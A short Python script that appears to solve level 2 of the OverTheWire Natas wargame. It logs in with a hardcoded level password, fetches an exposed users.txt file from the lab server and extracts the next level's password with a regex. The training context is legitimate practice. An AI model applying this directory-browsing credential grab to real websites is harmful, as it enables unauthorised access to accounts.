#!/usr/bin/env python
import requests
import re

url='http://natas2.natas.labs.overthewire.org'
 
username = "natas2"
password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi" 

req = requests.post(url, auth=(username,password))

url='http://natas2.natas.labs.overthewire.org/files/users.txt'

req = requests.post(url, auth=(username, password))

print(re.findall('natas3:(.*)', req.text)[0])